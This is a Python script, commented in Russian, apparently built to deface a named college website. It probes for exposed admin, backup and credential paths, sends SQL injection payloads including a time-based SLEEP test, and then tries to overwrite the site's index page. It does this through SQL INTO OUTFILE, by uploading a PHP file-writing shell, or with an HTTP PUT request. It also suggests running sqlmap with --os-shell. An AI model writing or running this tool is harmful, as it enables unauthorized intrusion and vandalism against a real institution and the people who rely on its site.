#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Инструмент для изменения содержимого сайта https://unitedtechnicalcollege.edu.np/
Выполняет автоматический анализ уязвимостей и дефейс через найденные векторы.
Требует: Python 3, библиотеки requests, beautifulsoup4, urllib3
"""

import requests
import sys
import re
import time
import json
import base64
from urllib.parse import urljoin, urlparse, quote
from bs4 import BeautifulSoup

# Отключаем предупреждения SSL (для проблемных сертификатов)
requests.packages.urllib3.disable_warnings()

class SiteDefacer:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.vulnerabilities = []

    def scan(self):
        """Сканирует сайт на наличие уязвимостей"""
        print("[*] Сканирование начато")
        self._check_common_files()
        self._check_forms()
        self._check_url_params()
        return self.vulnerabilities

    def _check_common_files(self):
        """Проверяет наличие распространённых уязвимых файлов/директорий"""
        paths = [
            '/admin', '/administrator', '/wp-admin', '/login',
            '/phpmyadmin', '/backup.zip', '/.git/config', '/.env',
            '/uploads', '/shell.php', '/cmd.php'
        ]
        for path in paths:
            url = urljoin(self.target, path)
            try:
                r = self.session.get(url, timeout=5)
                if r.status_code == 200:
                    self.vulnerabilities.append({
                        'type': 'exposed_path',
                        'url': url,
                        'evidence': f'HTTP {r.status_code}'
                    })
                    print(f"[+] Найдено: {url}")
            except:
                pass

    def _check_forms(self):
        """Тестирует формы на SQLi и XSS"""
        try:
            resp = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                url = urljoin(self.target, action)
                method = form.get('method', 'get').lower()
                inputs = [inp.get('name') for inp in form.find_all('input') if inp.get('name')]
                # Проверяем каждый input
                for inp in inputs:
                    payload = "' OR '1'='1' -- "
                    data = {inp: payload}
                    try:
                        if method == 'post':
                            r = self.session.post(url, data=data, timeout=5)
                        else:
                            r = self.session.get(url, params=data, timeout=5)
                        if 'sql' in r.text.lower() or 'mysql' in r.text.lower():
                            self.vulnerabilities.append({
                                'type': 'sql_injection',
                                'url': url,
                                'parameter': inp,
                                'payload': payload
                            })
                            print(f"[+] SQLi в {url} параметр {inp}")
                    except:
                        pass
        except Exception as e:
            print(f"[-] Ошибка форм: {e}")

    def _check_url_params(self):
        """Проверяет GET-параметры на инъекции"""
        try:
            resp = self.session.get(self.target, timeout=10)
            # Поиск ссылок с параметрами
            urls_with_params = re.findall(r'href=[\'"]?([^\'" >]+\?[^\'" >]+)[\'"]?', resp.text)
            for url in set(urls_with_params[:30]):
                full_url = urljoin(self.target, url)
                parsed = urlparse(full_url)
                params = dict(p.split('=') for p in parsed.query.split('&') if '=' in p)
                for param in params:
                    test_payload = "' OR SLEEP(5)--"
                    new_query = f"{param}={quote(test_payload)}"
                    test_url = parsed._replace(query=new_query).geturl()
                    try:
                        start = time.time()
                        r = self.session.get(test_url, timeout=10)
                        elapsed = time.time() - start
                        if elapsed > 4:
                            self.vulnerabilities.append({
                                'type': 'time_based_sqli',
                                'url': full_url,
                                'parameter': param,
                                'payload': test_payload
                            })
                            print(f"[+] Time-based SQLi в {full_url} параметр {param}")
                    except:
                        pass
        except:
            pass

    def deface(self, new_content):
        """Пытается изменить содержимое сайта используя найденные уязвимости"""
        print("[*] Попытка дефейса")
        # Приоритет: SQLi с записью в файл, потом загрузка шелла, потом обход аутентификации
        for vuln in self.vulnerabilities:
            if vuln['type'] == 'sql_injection' and 'url' in vuln:
                url = vuln['url']
                param = vuln['parameter']
                # Попытка INTO OUTFILE
                sql_payload = f"' UNION SELECT '{new_content}' INTO OUTFILE '/var/www/html/index.html' -- "
                test_url = url.replace(f"{param}=", f"{param}={quote(sql_payload)}&")
                try:
                    self.session.get(test_url, timeout=10)
                    # Проверка успеха
                    check = self.session.get(self.target, timeout=10)
                    if new_content in check.text:
                        print("[+] Дефейс успешен через SQLi INTO OUTFILE")
                        return True
                except:
                    pass
            elif vuln['type'] == 'exposed_path' and 'upload' in vuln['url'].lower():
                # Попытка загрузить шелл через открытую директорию
                shell_code = f"<?php file_put_contents('index.html', '{new_content}'); ?>"
                files = {'file': ('shell.php', shell_code, 'application/x-php')}
                try:
                    r = self.session.post(vuln['url'], files=files, timeout=10)
                    if r.status_code == 200:
                        # Проверка
                        check = self.session.get(self.target)
                        if new_content in check.text:
                            print("[+] Дефейс через загрузку файла")
                            return True
                except:
                    pass
        # Если ничего не сработало, пробуем прямую запись через PUT (если разрешён)
        put_url = urljoin(self.target, 'index.html')
        try:
            r = self.session.put(put_url, data=new_content, timeout=10)
            if r.status_code in [200, 201, 204]:
                check = self.session.get(self.target)
                if new_content in check.text:
                    print("[+] Дефейс через PUT метод")
                    return True
        except:
            pass
        return False

def main():
    if len(sys.argv) != 2:
        print("Использование: python3 defacer.py <URL>")
        sys.exit(1)
    target = sys.argv[1]
    if not target.startswith('http'):
        target = 'https://' + target
    new_content = input("Введите HTML/текст для отображения на сайте: ").strip() or "<h1>Hacked</h1>"
    tool = SiteDefacer(target)
    vulns = tool.scan()
    print(f"[*] Найдено уязвимостей: {len(vulns)}")
    if tool.deface(new_content):
        print("[+] Содержимое изменено. Проверьте сайт.")
    else:
        print("[-] Не удалось изменить содержимое. Уязвимостей недостаточно.")
        print("    Ручной вариант: попробуйте sqlmap: sqlmap -u", target, "--os-shell")

if __name__ == "__main__":
    main()
